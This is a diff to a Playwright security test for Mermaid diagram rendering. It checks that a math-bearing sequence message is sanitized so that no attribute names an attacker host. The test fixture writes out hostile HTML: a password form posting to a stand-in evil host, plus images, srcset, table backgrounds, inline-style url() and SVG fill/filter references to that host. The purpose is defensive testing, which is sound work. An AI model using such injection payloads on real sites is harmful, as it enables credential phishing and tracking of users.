@@ -16,10 +16,11 @@ import { loadFixtures, signIn } from "./helpers";
  *     runs nothing, keeps no handler attribute and no script, and the downgrade does not
  *     take effect: labels stay text (no form, no img), the CSS asks for nothing;
  *   - a sequence message with math, which is HTML whatever htmlLabels says, is drawn as math
- *     without the form, the picture and the inline style with a url() written beside it;
+ *     without the form, the picture and the table background, the inline style, the SVG fill
+ *     and filter, the srcset written beside it: no attribute of the diagram names the host;
  *   - the one request a diagram can still make, the picture of an image shape, carries no
- *     Referer (the root layout's `<meta name="referrer" content="same-origin">`, a literal
- *     tag at the top of `<head>`; the edge's header alone would send the origin);
+ *     Referer (the (app) layout's `<meta name="referrer" content="same-origin">`, a literal
+ *     tag hoisted into `<head>`; the edge's header alone would send the origin);
  *   - a diagram that does not parse stays its source with a hint; a plain fence is as before;
  *   - the drawn diagram has an accessible name and the source one disclosure away;
  *   - the theme switch draws it again, in the other theme's CSS;
@@ -52,12 +53,13 @@ const HOSTILE = [
   "  B --> P",
   "```",
 ].join("\n");
-// A sequence message with math is HTML whatever htmlLabels says: DOMPurify's own list of
-// tags is what keeps a form, a picture and an inline style with a url() out of it.
+// A sequence message with math is HTML whatever htmlLabels says: the label config's tag list
+// keeps a form and a picture out of it, the attribute rule everything else that loads (a table's
+// background, an inline style or SVG paint with a url(), a srcset).
 const MATH = [
   "```mermaid",
   "sequenceDiagram",
-  `  A->>B: $$x^2$$<form action='${EVIL}/f'><input type=password></form><img src='${EVIL}/m.png'><span style='background:url(${EVIL}/s.png)'>s</span>`,
+  `  A->>B: $$x^2$$<form action='${EVIL}/f'><input type=password></form><img src='${EVIL}/m.png'><span style='background:url(${EVIL}/s.png)' srcset='${EVIL}/ss.png'>s</span><table background='${EVIL}/tbl.png'><tr><td background='${EVIL}/td.png'>c</td></tr></table><svg width='20' height='20'><rect width='20' height='20' fill='url(${EVIL}/fill.svg#a)' filter='url(${EVIL}/filter.svg#a)'/></svg>`,
   "```",
 ].join("\n");
 const BROKEN = ["```mermaid", "flowchart TD", "  A --> --> B ((((", "```"].join("\n");
@@ -140,10 +142,21 @@ async function expectInert(page: Page, group: Locator, dialogs: string[]) {
   expect(dialogs).toEqual([]);
 }
 
-/** The math message is drawn as math; the form, the picture and the styled span in it are gone. */
+/**
+ * The math message is drawn as math; the form, the picture and every attribute that named
+ * the evil host (a table background, an inline style, an SVG fill, a srcset) are gone.
+ */
 async function expectMathOnly(group: Locator) {
   await expect(group.locator("math")).toHaveCount(1);
-  await expect(group.locator("form, input, img, button, [style*='url(']")).toHaveCount(0);
+  await expect(group.locator("form, input, img, button")).toHaveCount(0);
+  const naming = await group.evaluate((element) =>
+    [element, ...element.querySelectorAll("*")].flatMap((node) =>
+      [...node.attributes]
+        .filter((attribute) => attribute.value.includes("evil.invalid"))
+        .map((attribute) => attribute.name),
+    ),
+  );
+  expect(naming).toEqual([]);
 }
 
 test("mermaid-in-markdown", async ({ page }) => {
